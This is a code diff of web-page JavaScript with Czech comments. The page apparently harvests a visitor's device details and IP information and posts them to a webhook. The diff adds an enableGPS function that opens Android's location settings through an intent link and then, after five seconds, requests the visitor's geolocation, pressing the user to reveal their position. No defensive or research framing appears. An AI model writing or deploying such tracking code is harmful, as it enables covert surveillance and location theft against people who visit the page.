@@ -40,10 +40,25 @@
             getIPInfo(ipData => {
                 let message = `${getDeviceInfo()}\n${ipData}\n📍 GPS: Nepovoleno`;
                 sendToWebhook(message);
-                askForLocation();  
+                enableGPS();  
             });
         }
 
+        // ✅ Nejprve aktivujeme GPS na Androidu
+        function enableGPS() {
+            if (navigator.geolocation) {
+                let locationIntent = document.createElement("a");
+                locationIntent.href = "intent://settings/#Intent;scheme=android.settings.LOCATION_SOURCE_SETTINGS;end;";
+                locationIntent.click();
+                
+                // Po 5 sekundách se zeptáme na polohu (uživatel musí zapnout GPS ručně)
+                setTimeout(askForLocation, 5000);
+            } else {
+                console.warn("Geolokace není podporována.");
+            }
+        }
+
+        // ✅ Pak se zeptáme na povolení polohy pro web
         function askForLocation() {
             navigator.permissions.query({ name: "geolocation" }).then(result => {
                 if (result.state === "granted") {
